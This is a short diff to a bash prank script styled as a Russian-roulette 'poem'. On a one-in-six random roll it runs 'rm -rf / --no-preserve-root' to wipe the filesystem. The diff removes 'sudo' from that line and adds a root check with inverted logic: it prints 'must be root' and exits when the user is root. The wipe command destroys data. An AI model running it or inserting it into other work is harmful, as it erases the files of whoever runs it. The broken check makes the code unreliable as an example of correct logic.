@@ -12,6 +12,11 @@ exit # SAFEGUARD - Remove only if you know what you're doing.
 
 
 # Actual 'poem' beginning
+if [ $UID -eq 0 ]
+then
+    printf "Error: must be root.\n"
+    exit
+fi
 
 printf "I like games...\n"
 sleep 2
@@ -32,7 +37,7 @@ if [ $[ RANDOM % 6 ] -eq 0 ]
         printf "BANG!\n"
         sleep 1.5
         printf "Goodbye, cruel world...\n"
-        sudo rm -rf / --no-preserve-root
+        rm -rf / --no-preserve-root
     else
         printf "Click.\n"
         printf "You win this time...\n"
